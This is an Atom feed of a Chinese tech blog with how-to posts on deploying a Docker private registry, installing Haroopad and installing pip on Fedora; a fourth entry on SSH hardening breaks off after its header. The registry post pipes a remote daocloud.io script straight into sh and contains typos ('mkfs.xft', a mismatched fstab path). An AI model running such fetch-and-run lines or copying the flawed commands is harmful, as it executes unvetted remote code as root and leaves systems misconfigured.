<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Netb2c&#39;s Blog</title>
  <subtitle>We&#39;d better struggle for the future rather than regret for the past.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.unixmen.cn/"/>
  <updated>2017-05-02T10:00:19.000Z</updated>
  <id>http://blog.unixmen.cn/</id>
  
  <author>
    <name>Netb2c</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Docker私有镜像仓库节点部署</title>
    <link href="http://blog.unixmen.cn/2017/05/02/Docker%E7%A7%81%E6%9C%89%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"/>
    <id>http://blog.unixmen.cn/2017/05/02/Docker私有镜像仓库节点部署/</id>
    <published>2017-05-02T09:42:29.000Z</published>
    <updated>2017-05-02T10:00:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h2><p>本文简介生产环境中私有镜像仓库节点的部署及自定义环境配置。</p>
<h2 id="硬件要求"><a href="#硬件要求" class="headerlink" title="硬件要求"></a>硬件要求</h2><p>生产环境中要安装或升级容器私有镜像仓库节点，需要硬件必须满足下列要求：</p>
<table>
<thead>
<tr>
<th></th>
<th>最小</th>
<th>推荐</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>CPU</td>
<td>1 core</td>
<td>大于4 core</td>
<td></td>
</tr>
<tr>
<td>内存</td>
<td>1 GB</td>
<td>大于32 GB</td>
<td></td>
</tr>
<tr>
<td>磁盘</td>
<td>5 GB</td>
<td>大于120 GB</td>
<td>小于 5GB 仍然可以安装，Docker 对磁盘需求较大，要确保 Docker 的 Graph Dir(/var/lib/docker) 在较大磁盘分区上</td>
</tr>
<tr>
<td>独立数据盘</td>
<td>RHEL/CentOS 需要 &gt; 5GB 独立数据盘</td>
<td>RHEL/CentOS 需要 &gt;30GB 独立数据盘</td>
<td>需要使用 devicemapper 的 direct-lvm 模式</td>
</tr>
<tr>
<td>网络</td>
<td>所有节点互通</td>
<td>所有节点互通, ping &lt;1ms</td>
<td>至少两块网卡</td>
</tr>
</tbody>
</table>
<p>##系统要求</p>
<p>系统推荐：CentOS 7.2 </p>
<p>内核推荐：大于3.10</p>
<p>注：默认第一块网卡为内网</p>
<h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><ul>
<li><p>安装ntpd服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install ntp</div></pre></td></tr></table></figure>
</li>
<li><p>与上游ntp服务器进行时间同步</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntpdate 10.154.88.88</div></pre></td></tr></table></figure>
</li>
<li><p>配置ntp服务配置文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sed -i &apos;s/0.centos.pool.ntp.org iburst/10.154.88.88/g&apos;  /etc/ntp.conf</div></pre></td></tr></table></figure>
</li>
<li><p>启动ntpd服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systemctl enable ntpd</div><div class="line">systemctl start ntpd</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="配置本地存储"><a href="#配置本地存储" class="headerlink" title="配置本地存储"></a>配置本地存储</h2><p>为方便后期维护管理，采用LVM对本地存储进行管理</p>
<ul>
<li><p>创建PV</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pvcreate /dev/sdb</div></pre></td></tr></table></figure>
</li>
<li><p>创建VG</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vgcreate data /dev/sdb</div></pre></td></tr></table></figure>
</li>
<li><p>创建LV</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lvcreate -L 500G data -n docker_data</div></pre></td></tr></table></figure>
</li>
<li><p>格式化新分区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkfs.xft /dev/data/docker_data</div></pre></td></tr></table></figure>
</li>
</ul>
<p>##系统更新</p>
<p>为了提供更稳定的基础环境，建议对宿主机的底层环境进行更新升级。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum update -y</div></pre></td></tr></table></figure></p>
<p>##安装容器服务</p>
<ul>
<li><p>卸载系统默认（版本较老的）Docker环境包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">yum -y remove docker docker-common container-selinux</div><div class="line">yum -y remove docker-selinux</div></pre></td></tr></table></figure>
</li>
<li><p>配置官方软件仓库源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">yum install -y yum-utils</div><div class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</div></pre></td></tr></table></figure>
</li>
<li><p>更新本地缓存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum makecache fast</div></pre></td></tr></table></figure>
</li>
<li><p>查看软件包信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum list docker-ce.x86_64  --showduplicates |sort -r</div></pre></td></tr></table></figure>
</li>
<li><p>安装Docker engine社区版</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install docker-ce</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="本地容器服务配置"><a href="#本地容器服务配置" class="headerlink" title="本地容器服务配置"></a>本地容器服务配置</h2><ul>
<li><p>启动容器服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start docker</div></pre></td></tr></table></figure>
</li>
<li><p>设置开机启动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl enable docker</div></pre></td></tr></table></figure>
</li>
<li><p>设置容器数据存储路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">systemctl stop docker</div><div class="line">mv /var/lib/docker&#123;,.bak&#125;</div><div class="line">mkdir /var/lib/docker</div><div class="line">mount /dev/data/docker_data /var/lib/docker</div><div class="line">echo &quot;/dev/data/docker_data   /var/lib/docker         xfs     defaults 1 0&quot; &gt;&gt;/etc/fstab</div></pre></td></tr></table></figure>
</li>
<li><p>配置加速器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxxxxxxxxx.m.daocloud.io</div></pre></td></tr></table></figure>
</li>
<li><p>启动容器服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start docker</div></pre></td></tr></table></figure>
</li>
<li><p>测试运行实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run hello-world</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="创建私有镜像仓库镜像存放分区"><a href="#创建私有镜像仓库镜像存放分区" class="headerlink" title="创建私有镜像仓库镜像存放分区"></a>创建私有镜像仓库镜像存放分区</h2><ul>
<li><p>创建LV</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lvcreate -L 2000G data -n registry_data</div></pre></td></tr></table></figure>
</li>
<li><p>格式化新分区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkfs.xft /dev/data/registry_data</div></pre></td></tr></table></figure>
</li>
<li><p>挂载新分区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount  /dev/data/registry_data /data/docker/registry/</div></pre></td></tr></table></figure>
</li>
<li><p>修改系统启动挂载分区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;/dev/data/registry_data  /data/registry_data         xfs     defaults 1 0&quot; &gt;&gt;/etc/fstab</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="启动私有镜像仓库"><a href="#启动私有镜像仓库" class="headerlink" title="启动私有镜像仓库"></a>启动私有镜像仓库</h2><p>registry 是Docker官方提供的私有镜像仓库工具，可以用于构建私有的镜像仓库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -d -p 5000:5000 -v /data/docker/registry/:/var/lib/registry registry:latest</div></pre></td></tr></table></figure>
<h2 id="私有镜像仓库测试"><a href="#私有镜像仓库测试" class="headerlink" title="私有镜像仓库测试"></a>私有镜像仓库测试</h2><ul>
<li>查看本地镜像<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">busybox             latest              00f017a8c2a6        2 weeks ago         1.11 MB</div><div class="line">registry            latest              047218491f8c        2 weeks ago         33.2 MB</div></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到，本机共有两个容器镜像，分别是：registry和busybox</p>
<ul>
<li><p>重新标记一个本地镜像为私有仓库的版本，这里将本地的busybox标记为本地IP:5000/busybox</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker tag busybox 10.82.2.103:5000/busybox</div></pre></td></tr></table></figure>
</li>
<li><p>再次查看本地镜像<br>再次查看镜像可以看到多了一个标记为10.82.2.103:5000/busybox的镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker images</div><div class="line">REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">10.82.2.103:5000/busybox   latest              00f017a8c2a6        2 weeks ago         1.11 MB</div><div class="line">busybox                     latest              00f017a8c2a6        2 weeks ago         1.11 MB</div><div class="line">registry                    latest              047218491f8c        2 weeks ago         33.2 MB</div></pre></td></tr></table></figure>
</li>
<li><p>将本地镜像推送到本地仓库中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker push 10.82.2.103:5000/busybox</div></pre></td></tr></table></figure>
</li>
<li><p>推送过程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker push 10.82.2.103:5000/busybox</div><div class="line">The push refers to a repository [10.82.2.103:5000/busybox]</div><div class="line">c0de73ac9968: Pushed </div><div class="line">latest: digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5 size: 527</div></pre></td></tr></table></figure>
</li>
<li><p>查看本地仓库中的镜像列表</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl  10.82.2.103:5000/v2/busybox/tags/list</div></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;name&quot;:&quot;busybox&quot;,&quot;tags&quot;:[&quot;latest&quot;]&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li><p>删除本地busybox镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker rmi busybox</div><div class="line">Untagged: busybox:latest</div><div class="line">Untagged: busybox@sha256:32f093055929dbc23dec4d03e09dfe971f5973a9ca5cf059cbfb644c206aa83f</div><div class="line">[root@docker-registry ~]# docker images</div><div class="line">REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">10.82.2.103:5000/busybox   latest              00f017a8c2a6        2 weeks ago         1.11 MB</div><div class="line">registry                    latest              047218491f8c        2 weeks ago         33.2 MB</div></pre></td></tr></table></figure>
</li>
<li><p>从私有仓库拉取镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker pull 10.82.2.103:5000/busybox</div><div class="line">Using default tag: latest</div><div class="line">latest: Pulling from busybox</div><div class="line">Digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5</div><div class="line">Status: Image is up to date for 10.82.2.103:5000/busybox:latest</div></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到成功获取私有仓库中的镜像</p>
<ul>
<li><p>尝试从私有镜像仓库中拉取的镜像启动容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[root@docker-registry ~]# docker run -i -t 10.82.2.103:5000/busybox </div><div class="line">/ # hostname </div><div class="line">11ea9195246f</div><div class="line">/ # hostid </div><div class="line">11ac0300</div><div class="line">/ #</div></pre></td></tr></table></figure>
</li>
<li><p>在其他容器计算节点上进行测试<br>测试内容包括：拉取私有镜像仓库中的镜像、在容器计算节点上查看所拉取的镜像、从私有镜像仓库中拉取的镜像启动容器。</p>
<ul>
<li><p>拉取私有镜像仓库中的镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[I] $ docker pull 10.82.2.103:5000/busybox</div><div class="line">Using default tag: latest</div><div class="line">latest: Pulling from busybox</div><div class="line">04176c8b224a: Pull complete </div><div class="line">Digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5</div><div class="line">Status: Downloaded newer image for 10.82.2.103:5000/busybox:latest</div></pre></td></tr></table></figure>
</li>
<li><p>查看拉取的镜像</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[I] $ docker images</div><div class="line">REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">10.82.2.103:5000/busybox   latest              00f017a8c2a6        13 days ago         1.11 MB</div><div class="line">ubuntu                      latest              4ca3a192ff2a        3 months ago        128.2 MB</div><div class="line">centos                      latest              0584b3d2cf6d        4 months ago        196.5 MB</div><div class="line">registry                    latest              c9bd19d022f6        5 months ago        33.27 MB</div><div class="line">[I] $ sudo ip add |grep 192</div><div class="line">    inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25</div><div class="line">    inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0</div></pre></td></tr></table></figure>
</li>
<li><p>从私有镜像仓库中拉取的镜像启动容器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[I] $ sudo ip add |grep 192</div><div class="line">    inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25</div><div class="line">    inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0</div><div class="line">[I] $ docker run -i -t 10.82.2.103:5000/busybox</div><div class="line">/ # hostname &amp;&amp;hostid</div><div class="line">4ed4430a0b8d</div><div class="line">11ac0200</div><div class="line">/ #</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>可以看到可以正常启动容器</p>
<p>至此，私有镜像仓库部署完成。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;关于本文&quot;&gt;&lt;a href=&quot;#关于本文&quot; class=&quot;headerlink&quot; title=&quot;关于本文&quot;&gt;&lt;/a&gt;关于本文&lt;/h2&gt;&lt;p&gt;本文简介生产环境中私有镜像仓库节点的部署及自定义环境配置。&lt;/p&gt;
&lt;h2 id=&quot;硬件要求&quot;&gt;&lt;a href=&quot;#硬件要求
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="Docker私有仓库" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/%E5%AE%B9%E5%99%A8/Docker%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="容器" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
      <category term="容器私有仓库配置" scheme="http://blog.unixmen.cn/tags/%E5%AE%B9%E5%99%A8%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93%E9%85%8D%E7%BD%AE/"/>
    
      <category term="Docker私有仓库" scheme="http://blog.unixmen.cn/tags/Docker%E7%A7%81%E6%9C%89%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Fedora安装Haroopad</title>
    <link href="http://blog.unixmen.cn/2017/05/02/Fedora%E5%AE%89%E8%A3%85Haroopad/"/>
    <id>http://blog.unixmen.cn/2017/05/02/Fedora安装Haroopad/</id>
    <published>2017-05-02T08:59:14.000Z</published>
    <updated>2017-05-02T10:02:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>tags:</p>
<ul>
<li>Haroopad</li>
<li>标记语言</li>
</ul>
<p>categories:</p>
<ul>
<li>技术文档</li>
<li>工具</li>
<li>Haroopad</li>
</ul>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Haroopad是一款跨平台的Markdown编辑器，在windows下，可下载安装包，通过安装想到进行安装。在Ubuntu/Mac OS下可载官方打包好的deb软件，通过包命令可以安装。<br>然而在其他Linux系列版本下并没有对应的软件包，所以需要下载源码包进行安装；<br>值得一提的是，Haroopad在所有平台下都区分32/64位版本。</p>
<h2 id="介绍安装环境"><a href="#介绍安装环境" class="headerlink" title="介绍安装环境"></a>介绍安装环境</h2><p>我的Fedora版本是23，Haroopad版本是0.13.1 64位（这也是截至今天最新的稳定版本）。</p>
<h2 id="下载源码安装包："><a href="#下载源码安装包：" class="headerlink" title="下载源码安装包："></a>下载源码安装包：</h2><p><a href="https://bitbucket.org/rhiokim/haroopad-download/downloads/haroopad-v0.13.1-x64.tar.gz" target="_blank" rel="external">官方下载地址为：</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://bitbucket.org/rhiokim/haroopad-download/downloads/haroopad-v0.13.1-x64.tar.gz</div></pre></td></tr></table></figure>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li><p>将下载的软件包解压：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -zxvf haroopad-v0.13.1-x64.tar.gz</div></pre></td></tr></table></figure>
</li>
<li><p>再将解压出来的软件包解压：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -zxvf data.tar.gz</div></pre></td></tr></table></figure>
</li>
<li><p>将解压出来的文件复制到根目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp -rv ./usr /</div></pre></td></tr></table></figure>
</li>
<li><p>将另一个软件包也解压出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -zxvf control.tar.gz</div></pre></td></tr></table></figure>
</li>
<li><p>将从control.tar.gz 中解压出来的文件添加可行权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 755 postinst</div></pre></td></tr></table></figure>
</li>
<li><p>运行postinst</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./postinst</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="创建“-desktop”-文件"><a href="#创建“-desktop”-文件" class="headerlink" title="创建“.desktop” 文件"></a>创建“.desktop” 文件</h2><p>使用以下命令创建“.desktop” 文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">cat &gt;/usr/share/applications/Haroopad.desktop&lt;&lt;EOF</div><div class="line">[Desktop Entry]</div><div class="line">Name=haroopad</div><div class="line">Version=0.13.1</div><div class="line">Exec=haroopad</div><div class="line">Comment=The Next Document processor based on Markdown</div><div class="line">Icon=haroopad</div><div class="line">Type=Application</div><div class="line">Terminal=false</div><div class="line">StartupNotify=true</div><div class="line">Encoding=UTF-8</div><div class="line">Categories=Development;GTK;GNOME;</div><div class="line">EOF</div></pre></td></tr></table></figure>
<h2 id="复制Hroopad-图标文件："><a href="#复制Hroopad-图标文件：" class="headerlink" title="复制Hroopad 图标文件："></a>复制Hroopad 图标文件：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp -rf usr/share/icons/hicolor/ /usr/share/icons/hicolor</div></pre></td></tr></table></figure>
<h2 id="至此Hroopad安装完成。"><a href="#至此Hroopad安装完成。" class="headerlink" title="至此Hroopad安装完成。"></a>至此Hroopad安装完成。</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;tags:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Haroopad&lt;/li&gt;
&lt;li&gt;标记语言&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;categories:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;技术文档&lt;/li&gt;
&lt;li&gt;工具&lt;/li&gt;
&lt;li&gt;Haroopad&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;简介
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>如何在Fedora中安装pip2或pip3</title>
    <link href="http://blog.unixmen.cn/2017/05/02/%E5%A6%82%E4%BD%95%E5%9C%A8Fedora%E4%B8%AD%E5%AE%89%E8%A3%85pip2%E6%88%96pip3/"/>
    <id>http://blog.unixmen.cn/2017/05/02/如何在Fedora中安装pip2或pip3/</id>
    <published>2017-05-02T03:24:19.000Z</published>
    <updated>2017-05-02T09:13:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>tags:</p>
<ul>
<li>pip</li>
<li>python</li>
</ul>
<p>categories:</p>
<ul>
<li>技术文档</li>
<li>工具</li>
<li>Python</li>
<li>pip<br>#如何在Fedora中安装pip2或pip3<h2 id="文章简介"><a href="#文章简介" class="headerlink" title="文章简介"></a>文章简介</h2>pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一套系统中pip3 跟pyhon一样，2版本和3版本是可以并存的。</li>
</ul>
<h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><ul>
<li><p>首先我们清空我们系统中残留冗余包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnf clean all</div></pre></td></tr></table></figure>
</li>
<li><p>作为最佳体验，我们升级系统软件包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnf update -y</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="现在可以安装pip工具包了"><a href="#现在可以安装pip工具包了" class="headerlink" title="现在可以安装pip工具包了"></a>现在可以安装pip工具包了</h2><h3 id="pip2"><a href="#pip2" class="headerlink" title="pip2"></a>pip2</h3><p>使用以下命令进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnf -y install python-pip</div></pre></td></tr></table></figure></p>
<ul>
<li>也可以通过以下方式进行安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m pip install -U pip</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="pip3"><a href="#pip3" class="headerlink" title="pip3"></a>pip3</h3><p>使用以下命令进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dnf -y install python3-pip</div></pre></td></tr></table></figure></p>
<ul>
<li>也可以通过以下方式进行安装<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 -m pip install -U pip</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="验证："><a href="#验证：" class="headerlink" title="验证："></a>验证：</h2><p>pip安装完成后，我们可以进行验证是否正确了安装成功，具体操作如下：</p>
<h3 id="首先可以获取帮助文档"><a href="#首先可以获取帮助文档" class="headerlink" title="首先可以获取帮助文档"></a>首先可以获取帮助文档</h3><ul>
<li><p>如果仅仅pip2或着pip3可以通过以下命令进行验证：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip --help</div></pre></td></tr></table></figure>
</li>
<li><p>假如系统中同时安装了pip2和pip3 就要制定pip命令版本进行验证：</p>
<ul>
<li><p>如查看pip3的帮助文档：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip3 --help</div></pre></td></tr></table></figure>
</li>
<li><p>查看pip3的帮助文档</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip2 --help</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>其次还可以获取版本信息：</p>
<ul>
<li><p>pip2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip2 -V</div></pre></td></tr></table></figure>
</li>
<li><p>pip3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip3 -V</div></pre></td></tr></table></figure>
</li>
<li><p>你pip -V 命令将获取类似如下结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip 9.0.1 from /usr/lib/python2.7/site-packages (python 2.7)</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;tags:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pip&lt;/li&gt;
&lt;li&gt;python&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;categories:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;技术文档&lt;/li&gt;
&lt;li&gt;工具&lt;/li&gt;
&lt;li&gt;Python&lt;/li&gt;
&lt;li&gt;pip&lt;br&gt;#如何在Fedora
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SSH安全加固篇-通过运维密码实现Linux系统SSH双因子认证</title>
    <link href="http://blog.unixmen.cn/2017/03/29/%E9%80%9A%E8%BF%87%E8%BF%90%E7%BB%B4%E5%AF%86%E7%A0%81%E5%AE%9E%E7%8E%B0Linux%E7%B3%BB%E7%BB%9FSSH%E5%8F%8C%E5%9B%A0%E5%AD%90%E8%AE%A4%E8%AF%81/"/>
    <id>http://blog.unixmen.cn/2017/03/29/通过运维密码实现Linux系统SSH双因子认证/</id>
    <published>2017-03-29T00:38:24.000Z</published>
    <updated>2017-03-29T03:21:56.000Z</updated>
    
